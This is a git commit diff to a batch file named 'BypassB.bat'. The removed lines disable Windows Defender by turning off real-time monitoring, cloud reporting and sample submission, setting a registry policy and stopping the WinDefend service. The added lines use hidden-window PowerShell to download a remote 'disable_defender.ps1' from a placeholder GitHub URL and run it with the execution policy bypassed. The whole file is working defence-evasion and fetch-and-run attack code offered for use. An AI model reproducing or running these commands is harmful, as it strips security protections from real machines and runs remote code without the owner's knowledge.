1526d9bf99eaa72017fe6b5bac754282a7807121
v-0v <108912188+v-0v@users.noreply.github.com>
2024-09-28 00:50:18 +0300

    run_hidden.bat

--- BypassB.bat
+++ BypassB.bat
@@ -1,8 +1,3 @@
 @echo off
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-powershell -Command "Set-MpPreference -MAPSReporting Disabled"
-powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
-powershell -Command "Stop-Service -Name WinDefend -Force"
-powershell -Command "Set-Service -Name WinDefend -StartupType Disabled"
-echo Windows Defender has been disabled.
+powershell -windowstyle hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/username/repository/main/disable_defender.ps1' -OutFile 'disable_defender.ps1'"
+powershell -windowstyle hidden -ExecutionPolicy Bypass -File "disable_defender.ps1"
